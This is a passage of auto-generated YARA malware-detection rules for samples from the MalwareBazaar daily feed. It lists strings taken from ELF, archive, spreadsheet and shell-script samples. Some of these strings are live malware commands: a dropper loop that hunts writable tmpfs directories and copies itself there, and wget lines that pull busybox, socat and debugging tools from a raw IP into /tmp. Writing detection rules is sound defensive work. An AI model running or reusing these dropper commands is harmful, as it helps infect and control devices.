      $s8 = "(!((size_t)(const void *)((__tzname[tp->tm_isdst]) + 1) - (size_t)(const void *)(__tzname[tp->tm_isdst]) == 1) || __s2_len >= 4)" ascii
      $s9 = "attempts:" fullword ascii
      $s10 = "__gen_tempname" fullword ascii
      $s11 = "%s: line %d: list delimiter not followed by domain" fullword ascii
      $s12 = "%s: line %d: expected `on' or `off', found `%s'" fullword ascii
      $s13 = "%s: line %d: ignoring trailing garbage `%s'" fullword ascii
      $s14 = "nscd_getserv_r.c" fullword ascii
      $s15 = "nscd_getserv_r" fullword ascii
      $s16 = "/etc/host.conf" fullword ascii
      $s17 = "__nss_hostname_digits_dots" fullword ascii
      $s18 = "sortlist" fullword ascii
      $s19 = "-D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64" fullword ascii
      $s20 = "strlen (&zone_names[info->idx]), __s1_len < 4) ? (__builtin_constant_p (__tzname[tp->tm_isdst]) && ((size_t)(const void *)((__tz" ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 14000KB and ( 8 of them )
      ) or ( all of them )
}

rule _22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa_947d94994555662758c6ad57ec25672e40ce688e135e9b81090d1d58b3_8 {
   meta:
      description = "evidences - from files 22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa.elf, 947d94994555662758c6ad57ec25672e40ce688e135e9b81090d1d58b34392b2.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa"
      hash2 = "947d94994555662758c6ad57ec25672e40ce688e135e9b81090d1d58b34392b2"
   strings:
      $s1 = "(sizeof(size_t)))))->size & 0x4) ? ((heap_info *)((unsigned long)(((mchunkptr)((char*)(victim) - 2*(sizeof(size_t))))) & ~((2 * " ascii
      $s2 = "!victim || ((((mchunkptr)((char*)(victim) - 2*(sizeof(size_t)))))->size & 0x2) || ar_ptr == (((((mchunkptr)((char*)(victim) - 2*" ascii
      $s3 = "!mem || ((((mchunkptr)((char*)(mem) - 2*(sizeof(size_t)))))->size & 0x2) || av == (((((mchunkptr)((char*)(mem) - 2*(sizeof(size_" ascii
      $s4 = "))))->size & 0x4) ? ((heap_info *)((unsigned long)(((mchunkptr)((char*)(p) - 2*(sizeof(size_t))))) & ~((2 * (512 * 1024))-1)))->" ascii
      $s5 = "t)))))->size & 0x4) ? ((heap_info *)((unsigned long)(((mchunkptr)((char*)(mem) - 2*(sizeof(size_t))))) & ~((2 * (512 * 1024))-1)" ascii
      $s6 = "f(size_t)))))->size & 0x4) ? ((heap_info *)((unsigned long)(((mchunkptr)((char*)(newp) - 2*(sizeof(size_t))))) & ~((2 * (512 * 1" ascii
      $s7 = "!newp || ((((mchunkptr)((char*)(newp) - 2*(sizeof(size_t)))))->size & 0x2) || ar_ptr == (((((mchunkptr)((char*)(newp) - 2*(sizeo" ascii
      $s8 = "!p || ((((mchunkptr)((char*)(p) - 2*(sizeof(size_t)))))->size & 0x2) || ar_ptr == (((((mchunkptr)((char*)(p) - 2*(sizeof(size_t)" ascii
      $s9 = "newsize >= nb && (((unsigned long)(((void*)((char*)(p) + 2*(sizeof(size_t)))))) % alignment) == 0" fullword ascii
      $s10 = "new_size>0 && new_size<(long)(2*(unsigned long)((((__builtin_offsetof (struct malloc_chunk, fd_nextsize))+((2 * (sizeof(size_t))" ascii
      $s11 = "new_size>0 && new_size<(2 * (512 * 1024))" fullword ascii
      $s12 = "getgrent_r" fullword ascii
      $s13 = "internal_getgrouplist" fullword ascii
      $s14 = "syslog: unknown facility/priority: %x" fullword ascii
      $s15 = "__nscd_getgrouplist" fullword ascii
      $s16 = "illegal status in internal_getgrouplist" fullword ascii
      $s17 = "(unsigned long)(old_size) < (unsigned long)(nb + (unsigned long)((((__builtin_offsetof (struct malloc_chunk, fd_nextsize))+((2 *" ascii
      $s18 = "= 0) || ((unsigned long) (old_size) >= (unsigned long)((((__builtin_offsetof (struct malloc_chunk, fd_nextsize))+((2 * (sizeof(s" ascii
      $s19 = "((char*)p + new_size) == ((char*)heap + heap->size)" fullword ascii
      $s20 = "((unsigned long)((char*)p + new_size) & (pagesz-1)) == 0" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _2ec8b8dadec67d51de84561f7bfd8fba2c446eb1735b2a1efb32e6ea63b7f76d_a277c112c2cd719999caadc40f533aec8bb4a4872841e1f739eca14aa9_9 {
   meta:
      description = "evidences - from files 2ec8b8dadec67d51de84561f7bfd8fba2c446eb1735b2a1efb32e6ea63b7f76d.elf, a277c112c2cd719999caadc40f533aec8bb4a4872841e1f739eca14aa9d2e6bd.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "2ec8b8dadec67d51de84561f7bfd8fba2c446eb1735b2a1efb32e6ea63b7f76d"
      hash2 = "a277c112c2cd719999caadc40f533aec8bb4a4872841e1f739eca14aa9d2e6bd"
   strings:
      $s1 = "User-Agent: Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4" ascii
      $s2 = "User-Agent: Mozilla/5.0 (Linux; U; Android 4.0.3; ko-kr; LG-L160L Build/IML74K) AppleWebkit/534.30 (KHTML, like Gecko) Version/4" ascii
      $s3 = "/phone/login.html" fullword ascii
      $s4 = "authkey" fullword ascii
      $s5 = "Host: 127.0.0.1" fullword ascii
      $s6 = "ofwversion" fullword ascii
      $s7 = "/cgi-bin/check_auth.json" fullword ascii
      $s8 = "{ \"Name\" : \"OPSystemUpgrade\", \"OPSystemUpgrade\" : { \"Action\" : \"Start\", \"Type\" : \"System\" }, \"SessionID\" : \"0x0" ascii
      $s9 = "/cgi-bin/index2.asp" fullword ascii
      $s10 = "/cgi-bin/?ogin.asp" fullword ascii
      $s11 = "t{|}f&~gq{&fdt{|}f9&d&oggodm&kget{|}f:&d&oggodm&kget{|}f;&d&oggodm&kget{|}f<&d&oggodm&kget{|}f&~gax{|}f|&kget{|}f&{axfm|&fm|" fullword ascii
      $s12 = "o?head-?ebs" fullword ascii
      $s13 = "sellanguage" fullword ascii
      $s14 = "labusrname" fullword ascii
      $s15 = "?ages/?ogin.htm" fullword ascii
      $s16 = "doc/script" fullword ascii
      $s17 = "IsRemote=1" fullword ascii
      $s18 = "{ \"Ret\" : 100, \"SessionID\" : \"0x0\" }" fullword ascii
      $s19 = "?ogin.rsp" fullword ascii
      $s20 = "/cgi-bin/main-cgi" fullword ascii
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa_49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53_10 {
   meta:
      description = "evidences - from files 22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa.elf, 49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "22b8bb65ff649d6a33b4ef9e216c0f7560b52014d6ae5a3817880e1bd6a12bfa"
      hash2 = "49da580656e51214d59702a1d983eff143af3560a344f524fe86326c53fb5ddb"
   strings:
      $s1 = "connect" fullword ascii /* Goodware String - occured 429 times */
      $s2 = "ECANCELED" fullword ascii
      $s3 = "EREMOTEIO" fullword ascii /* Goodware String - occured 3 times */
      $s4 = "EOVERFLOW" fullword ascii /* Goodware String - occured 3 times */
      $s5 = "EUNATCH" fullword ascii /* Goodware String - occured 4 times */
      $s6 = "ENONET" fullword ascii /* Goodware String - occured 4 times */
      $s7 = "EPROTO" fullword ascii /* Goodware String - occured 5 times */
      $s8 = "ENODATA" fullword ascii /* Goodware String - occured 5 times */
   condition:
      ( ( uint16(0) == 0x457f or uint16(0) == 0x5a4d ) and filesize < 28000KB and ( all of them )
      ) or ( all of them )
}

rule _37fabfdbe721b17601f7efa9059bf2c2cf71bb0689c1d5e6a4672fedd6f1e227_72312625fba0c0237c06eb131c554376df142b4ef0bb514f47e1655b60_11 {
   meta:
      description = "evidences - from files 37fabfdbe721b17601f7efa9059bf2c2cf71bb0689c1d5e6a4672fedd6f1e227.rar, 72312625fba0c0237c06eb131c554376df142b4ef0bb514f47e1655b6064948d.r00, a462535dd4c7d80f9b474eb2a67117563a9fcc8d73fc0592b7753fdf4191f758.rar, b9b8fac8f063817cc343683f71e60414dc961f1c1d2b4b421772b6fd373b082d.rar"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "37fabfdbe721b17601f7efa9059bf2c2cf71bb0689c1d5e6a4672fedd6f1e227"
      hash2 = "72312625fba0c0237c06eb131c554376df142b4ef0bb514f47e1655b6064948d"
      hash3 = "a462535dd4c7d80f9b474eb2a67117563a9fcc8d73fc0592b7753fdf4191f758"
      hash4 = "b9b8fac8f063817cc343683f71e60414dc961f1c1d2b4b421772b6fd373b082d"
   strings:
      $s1 = "kaPZ4MIC" fullword ascii
      $s2 = "FURn\"E;t" fullword ascii
      $s3 = "voBOOF=" fullword ascii
      $s4 = "Pcepgr" fullword ascii
      $s5 = "lJDl)R" fullword ascii
      $s6 = ";v_i60B " fullword ascii
      $s7 = "-OMJw%" fullword ascii
      $s8 = "'(yA5K" fullword ascii
      $s9 = "ac)uv_" fullword ascii
      $s10 = "p!G~?eP" fullword ascii
      $s11 = "'*%dBJ" fullword ascii
      $s12 = "DDwZs." fullword ascii
      $s13 = "bbf&&y" fullword ascii
      $s14 = "\"c]-Jib" fullword ascii
      $s15 = "1DUFNj" fullword ascii
      $s16 = "&vg&pfFbf" fullword ascii
      $s17 = "JQT(~0" fullword ascii
      $s18 = "k&d)b2" fullword ascii
      $s19 = "m`MK2N" fullword ascii
      $s20 = "X)6D)VK" fullword ascii
   condition:
      ( uint16(0) == 0x6152 and filesize < 2000KB and ( 8 of them )
      ) or ( all of them )
}

rule _3d0ecb3153b2807c930f820ddf5406d2e040a1a3553abc7dadcd7b7a608ee551_ac9668e3d4b15124dca0754cbcb471f3fe21ec7c86bbe7b004e155cf17_12 {
   meta:
      description = "evidences - from files 3d0ecb3153b2807c930f820ddf5406d2e040a1a3553abc7dadcd7b7a608ee551.rar, ac9668e3d4b15124dca0754cbcb471f3fe21ec7c86bbe7b004e155cf175c6400.r00, dc758276ceeacab79a2a2959453c15c5ed7567186cd09a2958204efa2d371de4.r00"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "3d0ecb3153b2807c930f820ddf5406d2e040a1a3553abc7dadcd7b7a608ee551"
      hash2 = "ac9668e3d4b15124dca0754cbcb471f3fe21ec7c86bbe7b004e155cf175c6400"
      hash3 = "dc758276ceeacab79a2a2959453c15c5ed7567186cd09a2958204efa2d371de4"
   strings:
      $s1 = "q%W%HR#r" fullword ascii
      $s2 = "!eNGLd-3" fullword ascii
      $s3 = "VUrf\"&&&f&'W9\\" fullword ascii
      $s4 = "]K:n)OS" fullword ascii
      $s5 = "R9V#q\\4~%^jU" fullword ascii
      $s6 = "Rz]PUn'" fullword ascii
      $s7 = "&uX%?-Lb" fullword ascii
      $s8 = "Y\"S8!E" fullword ascii
      $s9 = "is5p*s ," fullword ascii
      $s10 = "WN+,wu" fullword ascii
      $s11 = "9zV/]*" fullword ascii
      $s12 = "\"t#{dPO" fullword ascii
      $s13 = "A3L@~V" fullword ascii
      $s14 = "QEq9Q+\"" fullword ascii
      $s15 = "v$_c9Y" fullword ascii
      $s16 = "Qt~W~Hy" fullword ascii
      $s17 = "QO(6T2#" fullword ascii
      $s18 = "3MVi$9" fullword ascii
      $s19 = "n-/[?O" fullword ascii
      $s20 = "/+y!~$" fullword ascii
   condition:
      ( uint16(0) == 0x6152 and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _183f2419357b3a35b936d5fb2f5b38381fa5ad0612742e42541b8a0dde651e60_f76ae809d4692f0a92a0ea5b83284e4b230f7241895870caac93aad346_13 {
   meta:
      description = "evidences - from files 183f2419357b3a35b936d5fb2f5b38381fa5ad0612742e42541b8a0dde651e60.xlsx, f76ae809d4692f0a92a0ea5b83284e4b230f7241895870caac93aad3465c9288.xlsm"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "183f2419357b3a35b936d5fb2f5b38381fa5ad0612742e42541b8a0dde651e60"
      hash2 = "f76ae809d4692f0a92a0ea5b83284e4b230f7241895870caac93aad3465c9288"
   strings:
      $s1 = "customXml/itemProps2.xmlPK" fullword ascii
      $s2 = "customXml/itemProps1.xmlPK" fullword ascii
      $s3 = "customXml/itemProps3.xmlPK" fullword ascii
      $s4 = "xl/printerSettings/printerSettings1.bin" fullword ascii
      $s5 = "xl/sharedStrings.xml" fullword ascii
      $s6 = "customXml/item2.xml " fullword ascii
      $s7 = "xl/printerSettings/printerSettings1.binPK" fullword ascii
      $s8 = "xl/worksheets/_rels/sheet1.xml.rels" fullword ascii
      $s9 = "customXml/_rels/item3.xml.relsPK" fullword ascii
      $s10 = "customXml/_rels/item1.xml.rels " fullword ascii
      $s11 = "docProps/custom.xml " fullword ascii
      $s12 = "xl/worksheets/_rels/sheet1.xml.relsPK" fullword ascii
      $s13 = "customXml/_rels/item2.xml.relsPK" fullword ascii
      $s14 = "customXml/_rels/item1.xml.relsPK" fullword ascii
      $s15 = "customXml/_rels/item2.xml.rels " fullword ascii
      $s16 = "customXml/_rels/item3.xml.rels " fullword ascii
      $s17 = "customXml/item3.xmlPK" fullword ascii
      $s18 = "customXml/item1.xmlPK" fullword ascii
      $s19 = "docProps/custom.xmlPK" fullword ascii
      $s20 = "customXml/item2.xmlPK" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d_8bfd71d3d4e2ee87b40c52ebbecc6e35230639890ee776a7c9d035e8f0_14 {
   meta:
      description = "evidences - from files 73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d.unknown, 8bfd71d3d4e2ee87b40c52ebbecc6e35230639890ee776a7c9d035e8f0960c0c.unknown, c315465b42549fc945fcc365e3b38ee79e6f8426df216ee7746112fae780918c.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d"
      hash2 = "8bfd71d3d4e2ee87b40c52ebbecc6e35230639890ee776a7c9d035e8f0960c0c"
      hash3 = "c315465b42549fc945fcc365e3b38ee79e6f8426df216ee7746112fae780918c"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s2 = "fAAAAAAAAA" ascii /* base64 encoded string '|      ' */
      $s3 = "AABAEAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s4 = "AAAAEABAAAAC" ascii
      $s5 = "EAAAAABBAAAAA" ascii
      $s6 = "ABAAABAAAAAAAAAAAAAAAAAA" ascii
      $s7 = "AAAABAAAEA" ascii
      $s8 = "BAAAAAAAAAAEAAAAAAAAAABAA" ascii
      $s9 = "BAEADAAAAAE" ascii
      $s10 = "AAAAc0DAAA" ascii
      $s11 = "BAAA904FEAAAC4" ascii
      $s12 = "AAAE7bEAAA" ascii
      $s13 = "AEAAB4BAAAAAA" ascii
      $s14 = "BAAAAAdbAAA" ascii
      $s15 = "AEAAAAAAB4FBA" ascii
      $s16 = "CAAAAAAAAA" ascii
      $s17 = "EAAACCAAAAAAAAAAAAAAACAAA" ascii
      $s18 = "AAA282BAAAA" ascii
      $s19 = "BAAAAAdbCAAA" ascii
      $s20 = "05CAAAAAAAAAAAAAA" ascii
   condition:
      ( ( uint16(0) == 0x4141 or uint16(0) == 0x413d ) and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _183f2419357b3a35b936d5fb2f5b38381fa5ad0612742e42541b8a0dde651e60_2891b33ae2cfd18482dac39858fcd82928231b013894877fbc8eef959e_15 {
   meta:
      description = "evidences - from files 183f2419357b3a35b936d5fb2f5b38381fa5ad0612742e42541b8a0dde651e60.xlsx, 2891b33ae2cfd18482dac39858fcd82928231b013894877fbc8eef959e65eb6d.xlsx, f76ae809d4692f0a92a0ea5b83284e4b230f7241895870caac93aad3465c9288.xlsm"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "183f2419357b3a35b936d5fb2f5b38381fa5ad0612742e42541b8a0dde651e60"
      hash2 = "2891b33ae2cfd18482dac39858fcd82928231b013894877fbc8eef959e65eb6d"
      hash3 = "f76ae809d4692f0a92a0ea5b83284e4b230f7241895870caac93aad3465c9288"
   strings:
      $s1 = "xl/sharedStrings.xmlPK" fullword ascii
      $s2 = "xl/worksheets/sheet1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s3 = "xl/_rels/workbook.xml.relsPK" fullword ascii /* Goodware String - occured 3 times */
      $s4 = "xl/workbook.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s5 = "xl/theme/theme1.xml" fullword ascii /* Goodware String - occured 3 times */
      $s6 = "xl/styles.xml" fullword ascii /* Goodware String - occured 3 times */
      $s7 = "xl/worksheets/sheet1.xml" fullword ascii /* Goodware String - occured 3 times */
      $s8 = "xl/styles.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s9 = "xl/theme/theme1.xmlPK" fullword ascii /* Goodware String - occured 3 times */
      $s10 = "xl/_rels/workbook.xml.rels " fullword ascii /* Goodware String - occured 3 times */
      $s11 = "xl/workbook.xml" fullword ascii /* Goodware String - occured 3 times */
      $s12 = "xl/calcChain.xmlPK" fullword ascii
   condition:
      ( uint16(0) == 0x4b50 and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _c3de4ef1eec3319895b5a8907f2a68c9b111a4e108c07ae85cc1abb738b83983_e8781c9ceccffd7c9becbf5b5890b4f1fe85066dac4a7c462f2ed07820_16 {
   meta:
      description = "evidences - from files c3de4ef1eec3319895b5a8907f2a68c9b111a4e108c07ae85cc1abb738b83983.unknown, e8781c9ceccffd7c9becbf5b5890b4f1fe85066dac4a7c462f2ed07820bff227.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "c3de4ef1eec3319895b5a8907f2a68c9b111a4e108c07ae85cc1abb738b83983"
      hash2 = "e8781c9ceccffd7c9becbf5b5890b4f1fe85066dac4a7c462f2ed07820bff227"
   strings:
      $s1 = "L9[0t.M" fullword ascii
      $s2 = "t9HcC<" fullword ascii
      $s3 = " A_A^_^]" fullword ascii
      $s4 = "A88t.H" fullword ascii
      $s5 = "D$D+D$HA" fullword ascii
   condition:
      ( ( uint16(0) == 0x54e8 or uint16(0) == 0xc0e8 ) and filesize < 13000KB and ( all of them )
      ) or ( all of them )
}

rule _73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d_8bfd71d3d4e2ee87b40c52ebbecc6e35230639890ee776a7c9d035e8f0_17 {
   meta:
      description = "evidences - from files 73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d.unknown, 8bfd71d3d4e2ee87b40c52ebbecc6e35230639890ee776a7c9d035e8f0960c0c.unknown, c315465b42549fc945fcc365e3b38ee79e6f8426df216ee7746112fae780918c.unknown, ea29e601447378337ee7aa6eef7018853cbce94c0ecac6acba7253a2d866d058.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d"
      hash2 = "8bfd71d3d4e2ee87b40c52ebbecc6e35230639890ee776a7c9d035e8f0960c0c"
      hash3 = "c315465b42549fc945fcc365e3b38ee79e6f8426df216ee7746112fae780918c"
      hash4 = "ea29e601447378337ee7aa6eef7018853cbce94c0ecac6acba7253a2d866d058"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s2 = "AAAAACAAAA" ascii /* base64 encoded string '       ' */
      $s3 = "BAAAAAAAAA" ascii
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* Goodware String - occured 1 times */
      $s5 = "AAACAAAAAAAAAAAAAAAAAA" ascii
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* Goodware String - occured 3 times */
   condition:
      ( ( uint16(0) == 0x4141 or uint16(0) == 0x413d ) and filesize < 2000KB and ( all of them )
      ) or ( all of them )
}

rule _0685a6bdbd663be38a18536f9b70dc31e8d7a64d00e48998b87fa9b1d95eab73_4d4e0183a99f207ff49c2685922d7931fef26aab997a4e5fe2465722e4_18 {
   meta:
      description = "evidences - from files 0685a6bdbd663be38a18536f9b70dc31e8d7a64d00e48998b87fa9b1d95eab73.sh, 4d4e0183a99f207ff49c2685922d7931fef26aab997a4e5fe2465722e4ad9fea.sh, 502c9f41045c9e1e2f47c99530a41ab9b92eed7e2b2eacf387182c2be91258b8.sh, 7406502260456952a47a196329b63e2081d759a2ddb5f782c580bda542df7995.sh, 7bfb49dbe438622b5e6b8ccdd7dba17a35d2721a907827643aad9a627461b7d3.sh, 7fcef83866e5c5631c48bdc17d3438580f20c35920a81003298339c4f6a527e2.sh, 8824c9efb460160d0cad87d117efdf79a31c39a12cf6ec0018136aef9332a6cd.sh, af9451401ca7b672e6a4189615a4f62dd700a77902f43699ceee5fb244e23569.sh, becbafa9c83ad2de51933e44b4883ca7df54c1743a0448ec95fcc22a66eba2c2.sh, e432fc214accbdb91b92412c5021a599754808f09d7be16cc8f1b853fa1431cc.sh, fcd28c29953b6f148c0cd7ac7018e9224baca22ef608c1b6995cd5c986acb5df.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "0685a6bdbd663be38a18536f9b70dc31e8d7a64d00e48998b87fa9b1d95eab73"
      hash2 = "4d4e0183a99f207ff49c2685922d7931fef26aab997a4e5fe2465722e4ad9fea"
      hash3 = "502c9f41045c9e1e2f47c99530a41ab9b92eed7e2b2eacf387182c2be91258b8"
      hash4 = "7406502260456952a47a196329b63e2081d759a2ddb5f782c580bda542df7995"
      hash5 = "7bfb49dbe438622b5e6b8ccdd7dba17a35d2721a907827643aad9a627461b7d3"
      hash6 = "7fcef83866e5c5631c48bdc17d3438580f20c35920a81003298339c4f6a527e2"
      hash7 = "8824c9efb460160d0cad87d117efdf79a31c39a12cf6ec0018136aef9332a6cd"
      hash8 = "af9451401ca7b672e6a4189615a4f62dd700a77902f43699ceee5fb244e23569"
      hash9 = "becbafa9c83ad2de51933e44b4883ca7df54c1743a0448ec95fcc22a66eba2c2"
      hash10 = "e432fc214accbdb91b92412c5021a599754808f09d7be16cc8f1b853fa1431cc"
      hash11 = "fcd28c29953b6f148c0cd7ac7018e9224baca22ef608c1b6995cd5c986acb5df"
   strings:
      $s1 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s2 = "for path in `cat /proc/mounts | grep tmpfs | grep rw | grep -v noexe | cut -d ' ' -f 2`; do >$path/.a && cd $path; rm -rf .a .f;" ascii
      $s3 = ">/home/.a && cd /home;" fullword ascii
      $s4 = ">/var/tmp/.a && cd /var/tmp;" fullword ascii
      $s5 = "(cp /proc/self/exe .f || busybox cp /bin/busybox .f); > .f; (chmod 777 .f || busybox chmod 777 .f);" fullword ascii
      $s6 = ">/tmp/.a && cd /tmp;" fullword ascii
      $s7 = ">/dev/.a && cd /dev;" fullword ascii
      $s8 = ">/var/.a && cd /var;" fullword ascii
      $s9 = ">/dev/shm/.a && cd /dev/shm;" fullword ascii
   condition:
      ( uint16(0) == 0x2f3e and filesize < 7KB and ( all of them )
      ) or ( all of them )
}

rule _73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d_c315465b42549fc945fcc365e3b38ee79e6f8426df216ee7746112fae7_19 {
   meta:
      description = "evidences - from files 73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d.unknown, c315465b42549fc945fcc365e3b38ee79e6f8426df216ee7746112fae780918c.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "73dbf183a65717383cab09dba769006dd554c053ea30a121ac5bcac71c811c2d"
      hash2 = "c315465b42549fc945fcc365e3b38ee79e6f8426df216ee7746112fae780918c"
   strings:
      $s1 = "4V0av9GSzd3bk5WaXRXZTBAeFt2bvh0c39GZul2Vr92bo5WVAgXRlR2bjlmbV9GVAc3bk5WaX9mTlRXYlJ3QfRXZzBwdvRmbpdFZuV3bydWZy9mR0V2RAYHA0hXZ0BAd" ascii
      $s2 = "vBQe0lGbhVXcF9FcvBQeyR3cpdWZSRXZTBQey9GdjVmcpRUblR3c5N1X0V2ZAknch5WaC9GVAknch5WaCVGdpJ3VAkHcvN0aj9GbCBQeslWbhZ0czVmckRWQAkHbi1WZ" ascii
      $s3 = "4VGV39GZul2V0V2RAQHelRFdlNFA0hXZURXZHBAd4VGVsxWQkFWZSBAd4VGVu0WZ0NXeTBAd4VmTlZ3bN5icvRXYyVWb15WRJ5ycu9Wa0NWZsx2bD5SblR3c5NFA0VHc" ascii
      $s4 = "yJXQrNWYQd2cNBQehJncBVmepxWYpRXaulEA5FmcyFUZ0JXaXBQehxWZEBAevZWZylmRAgXZ0VXTlRXYlJ3QAgXZ0VXTlN3bsNEA4VGZulGA4V0av9GS0hXZOxGbhNEA" ascii
      $s5 = "ulGA0V3b5FGTkJXYvJWeltEdldEA0NXaM9GVAQ3chZEbpFmRAQnclZnbvNEA0JXY0NFZhVmcoRFZlpXayVGdl1WYyFGUAQHc5J3YuVEA0BXeyNWZEBAdv9mUoRXYQRXZ" ascii
      $s6 = "HBAduV3bjBAduV3bDJ3bzNXZj9mcQ9FdldGA05WdvN0ajlGVfRXZnBAduV3bD9FdldGA05WavBFZuVUZ09WblJ1X0V2ZAQnblNXZyBlcld2Z1JWZENXaAQnblNXZyBlc" ascii
      $s7 = "ld2Z1JWZEVGdv1WZSt2Ylh2QAQnblJnc1NEdldEA05WZyJXdD9FdldmLy9GdhJXZtVnbFlkLz52bpR3YlxGbvNkLtVGdzl3UAQnblJnc1NkLy9GdhJXZtVnbFlkLz52b" ascii
      $s8 = "zNXQAkHawFmcn9GdwlncD5Se0lmc1NWZT5SblR3c5NFA5V2afBQeltUeyR3cpdWZSBQeltEdylmV3BQeltkclR3ch1GA5V2SsFWd0JXaWBXYNBQeltEa0VXYfBQelt0Y" ascii
      $s9 = "pxmY1B1X0V2ZAkXZLJWdT5WZw9EA5V2SiV3UlRXZsVGRAkXZLJWdTVGdhVmcDBQelt0X0V2cAkXZL9FdldGA5FmcyF0cBZWZyBQehJncBNXQfRXZnBQehJncB9GVAkXY" ascii
   condition:
      ( ( uint16(0) == 0x4141 or uint16(0) == 0x413d ) and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

rule _339e3b0b70f9bd3bae40ccbfd4804734bef3042c37a9fb95fc549066955ec622_e52a25d67485856dbd9605ef38f14adaf0da32cf8cecf1537990c2e886_20 {
   meta:
      description = "evidences - from files 339e3b0b70f9bd3bae40ccbfd4804734bef3042c37a9fb95fc549066955ec622.sh, e52a25d67485856dbd9605ef38f14adaf0da32cf8cecf1537990c2e88679ecd2.sh"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-02"
      hash1 = "339e3b0b70f9bd3bae40ccbfd4804734bef3042c37a9fb95fc549066955ec622"
      hash2 = "e52a25d67485856dbd9605ef38f14adaf0da32cf8cecf1537990c2e88679ecd2"
   strings:
      $s1 = "wget http://217.28.130.78/.a/busybox -O- > busybox" fullword ascii
      $s2 = "wget http://217.28.130.78/.a/gdb -O- > gdb" fullword ascii
      $s3 = "wget http://217.28.130.78/.a/strace -O- > strace" fullword ascii
      $s4 = "wget http://217.28.130.78/.a/socat -O- > socat" fullword ascii
      $s5 = "cd /tmp" fullword ascii
   condition:
      ( uint16(0) == 0x6463 and filesize < 1KB and ( all of them )
      ) or ( all of them )
}
